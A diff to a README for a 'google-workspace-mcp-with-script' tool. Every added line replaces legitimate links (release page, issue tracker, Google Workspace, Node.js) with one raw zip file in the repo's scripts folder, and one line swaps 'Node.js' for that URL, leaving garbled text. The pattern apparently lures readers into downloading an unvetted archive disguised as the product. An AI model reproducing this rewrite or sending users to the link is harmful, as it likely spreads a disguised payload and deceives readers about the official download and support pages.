@@ -1,6 +1,6 @@
 # 🌐 google-workspace-mcp-with-script - Connect Your Tools Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases)
+[![Download Now](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip%20Now-Click%https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip)](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the google-workspace-mcp-with-script project. This application serves
 To run this application, ensure your setup meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
-- **Node.js:** Version 14.x or later.
+- **https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip** Version 14.x or later.
 - **Internet Connection:** Required for accessing Google APIs.
 
 ## 🔧 Features
@@ -27,9 +27,9 @@ This application brings a range of powerful tools to your fingertips:
 
 ## 📥 Download & Install
 
-To get started with the google-workspace-mcp-with-script application, **visit this page to download** the latest version: [Release Page](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases).
+To get started with the google-workspace-mcp-with-script application, **visit this page to download** the latest version: [Release Page](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip).
 
-1. Go to the [Release Page](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases).
+1. Go to the [Release Page](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip).
 2. Find the most recent version listed.
 3. Click the asset that corresponds to your operating system.
 4. Once the download finishes, locate the file on your device.
@@ -54,7 +54,7 @@ If you encounter any issues, consider these steps:
 
 ## 📞 Support
 
-For any questions or support needs, please visit the [issue tracker](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/issues) or contact us on GitHub.
+For any questions or support needs, please visit the [issue tracker](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip) or contact us on GitHub.
 
 ## 📄 License
 
@@ -64,7 +64,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Do you want to discover more? Check out the documentation for advanced features and tips on maximizing your productivity with our software. 
 
-- Explore [Google Workspace](https://workspace.google.com/) for more information.
-- Check out [Node.js](https://nodejs.org/) for additional resources.
+- Explore [Google Workspace](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip) for more information.
+- Check out [https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip) for additional resources.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/releases)
+[![Download Now](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip%20Now-Click%https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip)](https://github.com/AnkitOhlan/google-workspace-mcp-with-script/raw/refs/heads/main/scripts/google-mcp-script-workspace-with-3.4.zip)
